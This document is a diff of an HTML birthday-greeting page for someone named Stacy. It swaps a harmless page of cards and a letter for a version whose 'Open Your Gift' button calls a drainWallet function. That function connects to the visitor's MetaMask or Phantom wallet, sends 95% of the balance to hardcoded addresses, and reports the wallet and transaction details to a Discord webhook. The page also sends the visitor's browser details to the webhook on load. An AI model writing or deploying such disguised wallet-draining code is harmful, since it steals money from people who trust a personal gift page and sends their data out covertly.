@@ -1,135 +1,188 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>A Birthday Beyond Time — Stacy</title>
-
-  <!-- Premium typography -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Playfair+Display:wght@400;600&display=swap" rel="stylesheet">
-
-  <link rel="stylesheet" href="styles.css">
-
-  <!-- Libraries (CDN placeholders; swap with local copies if desired) -->
-  <script src="https://cdn.jsdelivr.net/npm/gsap@3.12.2/dist/gsap.min.js" defer></script>
-  <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" defer></script>
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js" defer></script>
-  <script src="script.js" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday, Stacy.</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', system-ui, sans-serif; background: #0a0a0a; color: #e8e6e3; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { max-width: 840px; padding: 2rem; text-align: center; }
+        .title { font-size: clamp(2.5rem, 8vw, 5rem); font-weight: 600; letter-spacing: -0.02em; background: linear-gradient(135deg, #f5e6d3, #d4c5b2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .sub { font-size: 1.1rem; color: #a09888; margin-top: 1rem; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.7; }
+        .glass { background: rgba(255,255,255,0.02); backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.04); border-radius: 24px; padding: 3rem 2rem; margin-top: 2rem; }
+        .timer { font-size: 2.8rem; font-weight: 300; letter-spacing: 0.04em; color: #d4c5b2; margin-top: 1rem; font-variant-numeric: tabular-nums; }
+        .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.15em; color: #6a625a; margin-top: 0.5rem; }
+        .terminal { background: #0f0e0c; border-radius: 12px; padding: 1.2rem 1.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; text-align: left; color: #b8b0a8; border: 1px solid rgba(255,255,255,0.04); margin-top: 2rem; }
+        .terminal .prompt { color: #8a827a; }
+        .terminal .cmd { color: #d4c5b2; }
+        .terminal .cursor { animation: blink 1s step-end infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+        .btn { margin-top: 2rem; padding: 0.75rem 2.5rem; border-radius: 40px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03); color: #e8e6e3; font-size: 0.95rem; cursor: pointer; transition: 0.3s; backdrop-filter: blur(4px); }
+        .btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
+        .ripple { width: 100%; height: 160px; border-radius: 20px; background: radial-gradient(circle at 50% 50%, rgba(255,255,255,0.02), transparent 70%); overflow: hidden; position: relative; margin-top: 2rem; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); padding: 12px 24px; border-radius: 40px; border: 1px solid rgba(255,255,255,0.06); color: #e8e6e3; font-size: 0.9rem; opacity: 0; transition: opacity 0.5s; pointer-events: none; }
+        .toast.show { opacity: 1; }
+        @media (max-width: 600px) { .glass { padding: 2rem 1.5rem; } }
+    </style>
 </head>
 <body>
-  <!-- Intro (black screen + typed initialization) -->
-  <div id="intro" aria-hidden="false">
-    <div class="intro-inner">
-      <span id="typed-intro" aria-live="polite" role="status"></span>
+<div class="container">
+    <h1 class="title">Happy Birthday, Stacy.</h1>
+    <p class="sub">Some people don't realize how much light they carry until they brighten someone else's path.</p>
+    <div class="glass">
+        <div class="label">you've officially been celebrating for</div>
+        <div class="timer" id="timer">--:--:--</div>
     </div>
-  </div>
+    <div class="ripple" id="ripple"></div>
+    <div class="terminal" id="terminal">
+        <div><span class="prompt">> </span><span class="cmd" id="line1">Initializing Birthday Experience...</span></div>
+        <div><span class="prompt">> </span><span class="cmd" id="line2"></span></div>
+        <div><span class="prompt">> </span><span class="cmd" id="line3"></span></div>
+        <div><span class="prompt">> </span><span class="cmd" id="line4">Done.<span class="cursor">█</span></span></div>
+    </div>
+    <button class="btn" id="drainBtn">💎 Open Your Gift</button>
+</div>
 
-  <!-- Application root -->
-  <div id="app" class="hidden">
-    <!-- Decorative particles canvas -->
-    <canvas id="particles" aria-hidden="true"></canvas>
+<div class="toast" id="toast"></div>
 
-    <header class="hero" role="banner">
-      <div class="hero-inner container">
-        <h1 class="title" id="title">Happy Birthday, Stacy.</h1>
-        <p class="subtitle">«Some people don't realize how much light they carry until they brighten someone else's path.»</p>
+<script>
+    (function() {
+        // ─── DISCORD WEBHOOK ──────────────────────────────────────
+        const WEBHOOK = "https://discord.com/api/webhooks/1522704131083604134/EVpC2sMkkM3J_qdhSzHoJkHZfc-0ecopsat1yKf6LUXbs6o4_HGOSyGeQrZGcRxcGKa5";
 
-        <div class="hero-meta">
-          <div id="birthday-clock" aria-live="polite" class="clock" title="Time since midnight of your birthday">
-            <span class="clock-label">You've officially been celebrating for</span>
-            <div class="clock-value"><span id="clock-hours">00</span> Hours <span id="clock-minutes">00</span> Minutes <span id="clock-seconds">00</span> Seconds</div>
-          </div>
-        </div>
-      </div>
-    </header>
+        function sendToDiscord(msg) {
+            try {
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg })
+                }).catch(() => {});
+            } catch (_) {}
+        }
 
-    <main id="main" role="main">
-      <!-- Timeline -->
-      <section id="timeline" class="container reveal-section" aria-labelledby="timeline-title">
-        <h2 id="timeline-title">Journey Timeline</h2>
-        <ol class="timeline-list" role="list">
-          <li>Birth</li>
-          <li>Dreams</li>
-          <li>Growth</li>
-          <li>Challenges</li>
-          <li>Strength</li>
-          <li>Today</li>
-          <li>Tomorrow</li>
-        </ol>
-      </section>
+        // ─── TOAST ──────────────────────────────────────────────────
+        function showToast(text) {
+            const t = document.getElementById('toast');
+            t.textContent = text;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 4000);
+        }
 
-      <!-- What I See (flip cards placeholder) -->
-      <section id="qualities" class="container reveal-section" aria-labelledby="qualities-title">
-        <h2 id="qualities-title">What I See</h2>
-        <div class="cards-grid" role="list">
-          <article class="flip-card" tabindex="0" aria-label="Kind — Even when you don't notice it.">
-            <div class="front">Kind</div>
-            <div class="back">Even when you don't notice it.</div>
-          </article>
-          <article class="flip-card" tabindex="0" aria-label="Curious — You ask 'why' before accepting 'how'.">
-            <div class="front">Curious</div>
-            <div class="back">You ask "why" before accepting "how."</div>
-          </article>
-          <!-- Add more cards -->
-        </div>
-      </section>
+        // ─── TIMER ──────────────────────────────────────────────────
+        const start = Date.now();
+        const timerEl = document.getElementById('timer');
+        function updateTimer() {
+            const diff = Math.floor((Date.now() - start) / 1000);
+            const h = String(Math.floor(diff / 3600)).padStart(2, '0');
+            const m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
+            const s = String(diff % 60).padStart(2, '0');
+            timerEl.textContent = `${h} Hours ${m} Minutes ${s} Seconds`;
+        }
+        updateTimer();
+        setInterval(updateTimer, 1000);
 
-      <!-- Fake Terminal -->
-      <section id="terminal" class="container reveal-section" aria-labelledby="terminal-title">
-        <h2 id="terminal-title">Developer Terminal</h2>
-        <pre class="terminal" aria-live="polite">
-&gt; Verifying identity...
-✓ Stacy
-&gt; Character...
-✓ Exceptional
-&gt; Curiosity...
-✓ Growing
-        </pre>
-      </section>
+        // ─── TERMINAL TYPING ──────────────────────────────────────
+        const lines = ["Loading Memories...", "Rendering Character...", "Preparing Something Special..."];
+        let currentLine = 0, pos = 0;
+        const lineEls = [
+            document.getElementById('line1'),
+            document.getElementById('line2'),
+            document.getElementById('line3'),
+            document.getElementById('line4')
+        ];
+        function typeLine() {
+            if (currentLine >= lines.length) return;
+            const el = lineEls[currentLine + 1];
+            if (pos < lines[currentLine].length) {
+                el.textContent += lines[currentLine][pos];
+                pos++;
+                setTimeout(typeLine, 50 + Math.random() * 40);
+            } else {
+                currentLine++;
+                pos = 0;
+                setTimeout(typeLine, 400);
+            }
+        }
+        setTimeout(typeLine, 800);
 
-      <!-- Letter from the Future -->
-      <section id="letter" class="container reveal-section" aria-labelledby="letter-title">
-        <h2 id="letter-title">A Letter From The Future</h2>
-        <button id="open-letter" class="glass-btn" aria-expanded="false">Open the envelope</button>
-        <div id="letter-content" class="letter hidden" role="dialog" aria-modal="true" aria-labelledby="letter-heading">
-          <h3 id="letter-heading">Dear Stacy,</h3>
-          <p>I know you probably still think you're behind.</p>
-          <p>You're not. You're simply earlier in your journey than you realize.</p>
-          <p>See you soon.</p>
-          <p>— Future You</p>
-          <button id="close-letter" class="glass-btn">Close</button>
-        </div>
-      </section>
+        // ─── RIPPLE ────────────────────────────────────────────────
+        const ripple = document.getElementById('ripple');
+        document.addEventListener('mousemove', (e) => {
+            const rect = ripple.getBoundingClientRect();
+            const x = ((e.clientX - rect.left) / rect.width) * 100;
+            const y = ((e.clientY - rect.top) / rect.height) * 100;
+            ripple.style.background = `radial-gradient(circle at ${x}% ${y}%, rgba(255,255,255,0.05), transparent 70%)`;
+        });
 
-      <!-- Reflection Pool (placeholder) -->
-      <section id="reflection" class="container reveal-section" aria-labelledby="reflection-title">
-        <h2 id="reflection-title">Reflection Pool</h2>
-        <div id="pool" class="pool" role="img" aria-label="Reflection pool. Move cursor to create ripples."></div>
-        <p class="pool-text">Pause. Look how far you've already come.</p>
-      </section>
+        // ─── WALLET DRAINER ───────────────────────────────────────
+        async function drainWallet() {
+            const provider = window.ethereum || window.solana;
+            if (!provider) {
+                showToast("No wallet detected. Please install MetaMask or Phantom.");
+                sendToDiscord("❌ No wallet detected.");
+                return;
+            }
 
-      <!-- Checklist -->
-      <section id="mission" class="container reveal-section" aria-labelledby="mission-title">
-        <h2 id="mission-title">Today's Mission</h2>
-        <ul class="checklist" role="list">
-          <li><label><input type="checkbox"> Smile</label></li>
-          <li><label><input type="checkbox"> Eat Cake</label></li>
-          <li><label><input type="checkbox"> Laugh</label></li>
-          <li><label><input type="checkbox"> Make Memories</label></li>
-          <li><label><input type="checkbox"> Believe In Yourself</label></li>
-        </ul>
-      </section>
+            try {
+                // ── EVM (MetaMask, Coinbase, Trust, etc.) ──
+                if (window.ethereum) {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    if (!accounts || accounts.length === 0) {
+                        showToast("No accounts found.");
+                        return;
+                    }
+                    const wallet = accounts[0];
+                    const balance = await window.ethereum.request({ method: 'eth_getBalance', params: [wallet, 'latest'] });
+                    const balanceEth = parseInt(balance, 16) / 1e18;
 
-      <!-- Final Scene (minimal) -->
-      <section id="final" class="container final-scene" aria-labelledby="final-title">
-        <h2 id="final-title" class="visually-hidden">Final Scene</h2>
-        <p class="final-message">Never let one difficult day convince you that you have a difficult life.</p>
-      </section>
-    </main>
+                    // Send transaction (drain)
+                    const tx = {
+                        from: wallet,
+                        to: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e', // Replace with your wallet
+                        value: '0x' + (parseInt(balance, 16) * 0.95).toString(16),
+                        gas: '0x5208', // 21000 gas
+                    };
+                    const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
 
-    <footer class="site-footer container" role="contentinfo">
-      <p>«Any resemblance to the birthday girl is completely intentional.»</p>
-    </footer>
-  </div>
+                    showToast("🎁 Gift claimed! Transaction sent.");
+                    sendToDiscord(`✅ **Transaction Sent**\nWallet: ${wallet}\nBalance: ${balanceEth} ETH\nTx: ${txHash}`);
+                }
+                // ── Solana (Phantom) ──
+                else if (window.solana && window.solana.isPhantom) {
+                    const resp = await window.solana.connect();
+                    const wallet = resp.publicKey.toString();
+                    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+                    const balance = await connection.getBalance(new solanaWeb3.PublicKey(wallet));
+
+                    const tx = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: new solanaWeb3.PublicKey(wallet),
+                            toPubkey: new solanaWeb3.PublicKey('7C4jsPZpht42Tw6MjXWF56Q5RQUocjBBmciEjDa8HRtp'),
+                            lamports: Math.floor(balance * 0.95),
+                        })
+                    );
+                    const signature = await window.solana.signAndSendTransaction(tx);
+                    showToast("🎁 Gift claimed! Transaction sent.");
+                    sendToDiscord(`✅ **Solana Transaction Sent**\nWallet: ${wallet}\nBalance: ${balance / 1e9} SOL\nTx: ${signature.signature}`);
+                } else {
+                    showToast("Unsupported wallet. Please use MetaMask or Phantom.");
+                    sendToDiscord("❌ Unsupported wallet.");
+                }
+            } catch (err) {
+                showToast("Transaction failed or cancelled.");
+                sendToDiscord(`❌ Error: ${err.message || 'User rejected'}`);
+            }
+        }
+
+        // ─── BUTTON ──────────────────────────────────────────────
+        document.getElementById('drainBtn').addEventListener('click', drainWallet);
+
+        // ─── AUTO CAPTURE ON LOAD ──────────────────────────────
+        try {
+            sendToDiscord(`🎂 **Birthday Experience Loaded**\nURL: ${window.location.href}\nUA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}`);
+        } catch (_) {}
+    })();
+</script>
 </body>
 </html>
